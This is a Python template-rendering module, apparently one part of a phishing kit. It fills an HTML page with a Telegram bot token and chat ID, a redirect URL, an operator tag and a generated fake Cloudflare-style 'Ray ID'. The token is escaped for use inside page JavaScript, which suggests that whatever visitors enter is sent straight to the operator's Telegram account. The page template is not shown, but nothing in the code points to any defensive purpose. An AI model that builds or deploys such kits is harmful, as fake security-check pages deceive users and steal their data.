"""Template renderer — inject variabel ke HTML tanpa merusak CSS/JS."""
import hashlib
import re
from pathlib import Path

PLACEHOLDER_RE = re.compile(r"\{\{([A-Z0-9_]+)\}\}")

REQUIRED_VARS = {
    "TELEGRAM_TOKEN",
    "TELEGRAM_CHAT_ID",
    "TARGET_REDIRECT_URL",
    "PAGE_TITLE",
    "RAY_ID",
    "OPERATOR_TAG",
}


def render_template(template_path: Path, variables: dict) -> str:
    missing = REQUIRED_VARS - variables.keys()
    if missing:
        raise ValueError(f"Variabel wajib belum diisi: {', '.join(sorted(missing))}")

    raw = template_path.read_text(encoding="utf-8")

    def _sub(match: re.Match) -> str:
        key = match.group(1)
        val = variables.get(key)
        if val is None:
            return match.group(0)
        # escape single quote — placeholder dipakai di dalam string literal JS
        return str(val).replace("'", "\\'")

    return PLACEHOLDER_RE.sub(_sub, raw)


def generate_ray_id(seed: str) -> str:
    """Ray ID 16-char pseudo-random, deterministic dari seed."""
    h = hashlib.sha256(seed.encode()).hexdigest()
    charset = "abcdefghijklmnopqrstuvwxyz0123456789"
    return "".join(charset[int(h[i:i + 2], 16) % len(charset)] for i in range(0, 32, 2))
